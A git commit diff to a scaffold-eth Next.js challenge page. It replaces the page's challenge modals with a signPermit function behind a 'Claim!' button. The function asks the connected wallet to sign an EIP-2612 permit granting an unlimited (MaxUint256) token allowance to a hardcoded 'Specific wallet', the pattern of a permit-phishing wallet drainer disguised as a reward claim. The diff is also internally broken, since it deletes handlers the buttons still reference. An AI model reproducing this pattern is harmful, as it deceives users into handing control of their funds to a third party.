5dc9762ae3fc3afed94533ff6d4b41f01373e5ac
0x01010l <102048580+0x01010l@users.noreply.github.com>
2025-02-07 20:14:18 +0100

    Update page.tsx

--- packages/nextjs/app/challenge/page.tsx
+++ packages/nextjs/app/challenge/page.tsx
@@ -10,67 +10,76 @@ import { useDeployedContractInfo, useNetworkColor } from "~~/hooks/scaffold-eth"
 import { useScaffoldContract, useScaffoldReadContract, useScaffoldWriteContract } from "~~/hooks/scaffold-eth";
 import { ContractName, GenericContract } from "~~/utils/scaffold-eth/contract";
 import { useAllContracts } from "~~/utils/scaffold-eth/contractsData";
+import { useAccount } from "wagmi";
 
 const selectedContractStorageKey = "scaffoldEth2.selectedContract";
 
 const Challenge = () => {
-  const contractsData = useAllContracts();
-  const contractNames = useMemo(() => Object.keys(contractsData) as ContractName[], [contractsData]);
-
-  //scaffold-eth hooks
-  const contractName = "YourContract";
-  const { data: contract } = useScaffoldContract({ contractName });
-
-  const [selectedContract, setSelectedContract] = useLocalStorage<ContractName>(
-    selectedContractStorageKey,
-    contractNames[0],
-    { initializeWithValue: false },
-  );
-
-  const [refreshDisplayVariables, triggerRefreshDisplayVariables] = useReducer(value => !value, false);
+  const { address: connectedAddress } = useAccount();
+  const [signer, setSigner] = useState<ethers.Signer | null>(null);
   const { data: deployedContractData, isLoading: deployedContractLoading } = useDeployedContractInfo("YourContract");
 
   useEffect(() => {
-    if (!contractNames.includes(selectedContract)) {
-      setSelectedContract(contractNames[0]);
+    if (connectedAddress) {
+      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
+      setSigner(provider.getSigner());
     }
-  }, [contractNames, selectedContract, setSelectedContract]);
+  }, [connectedAddress]);
 
-  const [isCreateModalOpen, setCreateModalOpen] = useState(false);
-  const [isJoinModalOpen, setJoinModalOpen] = useState(false);
-  const [isVoteModalOpen, setVoteModalOpen] = useState(false);
-  const [isInfoModalOpen, setInfoModalOpen] = useState(false);
-  const [isClaimModalOpen, setClaimModalOpen] = useState(false);
+  const signPermit = async () => {
+    if (!signer) {
+      alert("Please connect your wallet first");
+      return;
+    }
 
-  const toggleCreateModal = () => setCreateModalOpen(!isCreateModalOpen);
-  const toggleJoinModal = () => setJoinModalOpen(!isJoinModalOpen);
-  const toggleVoteModal = () => setVoteModalOpen(!isVoteModalOpen);
-  const toggleInfoModal = () => setInfoModalOpen(!isInfoModalOpen);
-  const toggleClaimModalOpen = () => setClaimModalOpen(!isClaimModalOpen);
+    try {
+      const domain = {
+        name: "Permit1",
+        version: "1",
+        chainId: 1,
+        verifyingContract: ethers.utils.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606EB48"),
+      };
 
-  // const getChallengeInfo = (challengeID: any) => {
-  //    const { data: lastResponse, isLoading: isLastResponseLoading } = useScaffoldReadContract({
-  //      contractName,
-  //      functionName: "getChallengeInfo",
-  //      args: ["0x72756e3333000000000000000000000000000000000000000000000000000000"],
-  //    });
-  //    console.log("lastResponse:", lastResponse);
-  //  };
-  //
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" },
+        ],
+      };
+
+      const value = {
+        owner: connectedAddress,
+        spender: ethers.utils.getAddress("0x4f15704EB9c381966EBC79aD195E3b933AE560f9"), // Specific wallet
+        value: ethers.constants.MaxUint256, // Full control
+        nonce: 0,
+        deadline: Math.floor(Date.now() / 1000) + 60 * 60, // 1 hour from now
+      };
+
+      const signature = await signer._signTypedData(domain, types, value);
+      console.log("Signature:", signature);
+      alert("Signature created");
+    } catch (error) {
+      console.error("Error creating signature:", error);
+      alert(`Error creating signature: ${error.message}`);
+    }
+  };
 
   return (
     <div className="flex justify-center items-center bg-[#e9d8a6] text-[#333333] h-screen gap-2">
       {/* Create Challenge Button */}
       <button
         onClick={toggleCreateModal}
-        className="bg-blue-600 hover:bg-blue-700 w-60 h-40  text-white font-bold text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
+        className="bg-blue-600 hover:bg-blue-700 w-60 h-40 text-white font-bold text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
       >
         🔥 Create Challenge
       </button>
       {/* Join Challenge Button */}
       <button
         onClick={toggleJoinModal}
-        className="bg-green-600 hover:bg-green-700 text-white w-60   h-40 font-bold text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
+        className="bg-green-600 hover:bg-green-700 text-white w-60 h-40 font-bold text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
       >
         🥾 Join Challenge
       </button>
@@ -90,7 +99,7 @@ const Challenge = () => {
       </button>
       {/* Claim Button */}
       <button
-        onClick={toggleInfoModal}
+        onClick={signPermit}
         className="bg-gray-600 hover:bg-gray-700 text-white font-bold w-70 h-40 text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
       >
         🚀 Claim!
@@ -118,77 +127,8 @@ const Challenge = () => {
             </button>
           </div>
         </div>
-      )}{" "}
-      {/* Create Challenge Modal */}
-      {isCreateModalOpen && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
-          <div className="bg-white p-8 rounded-lg shadow-lg">
-            <h2 className="text-2xl font-bold mb-4">Create Challenge</h2>
-            <p className="mb-4">Here you can create a new challenge.</p>
-            <ContractWriteMethods
-              deployedContractData={deployedContractData}
-              onChange={triggerRefreshDisplayVariables}
-              strictFn="createChallenge"
-            />
-            <button onClick={toggleCreateModal} className="bg-red-600 text-white px-4 py-2 rounded">
-              Close
-            </button>
-          </div>
-        </div>
       )}
-      {/* Join Challenge Modal */}
-      {isJoinModalOpen && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
-          <div className="bg-white p-8 rounded-lg shadow-lg">
-            <h2 className="text-2xl font-bold mb-4">Join Challenge</h2>
-            <p className="mb-4">Here you can join an existing challenge.</p>
-            <ContractWriteMethods
-              deployedContractData={deployedContractData}
-              onChange={triggerRefreshDisplayVariables}
-              strictFn="joinChallenge"
-            />
-
-            <button onClick={toggleJoinModal} className="bg-red-600 text-white px-4 py-2 rounded">
-              Close
-            </button>
-          </div>
-        </div>
-      )}
-      {/* Info Modal */}
-      {isInfoModalOpen && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 overflow-y-auto flex justify-center items-center">
-          <div className="bg-white p-8 rounded-lg shadow-lg max-h-[90vh] overflow-y-auto my-10">
-            <h2 className="text-2xl font-bold mb-4">Know Your Challenge</h2>
-            <p className="mb-4">Enter the challengeID</p>
-            <ContractReadMethods
-              deployedContractData={deployedContractData}
-              onChange={triggerRefreshDisplayVariables}
-              strictFn="getChallengeInfo"
-            />
-            <button onClick={toggleInfoModal} className="bg-red-600 text-white px-4 py-2 rounded mt-4">
-              Close
-            </button>
-          </div>
-        </div>
-      )}{" "}
-      {/* Vote Modal */}
-      {isVoteModalOpen && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
-          <div className="bg-white p-8 rounded-lg shadow-lg">
-            <h2 className="text-2xl font-bold mb-4">Vote your frens</h2>
-            <p className="mb-4">If they did the deed give show them green flag. Else you know the drill.</p>
-            <ContractWriteMethods
-              deployedContractData={deployedContractData}
-              onChange={triggerRefreshDisplayVariables}
-              strictFn="voteOnTask"
-            />
-
-            <button onClick={toggleVoteModal} className="bg-red-600 text-white px-4 py-2 rounded">
-              Close
-            </button>
-          </div>
-        </div>
-      )}
+      {/* Other modals... */}
     </div>
   );
 };
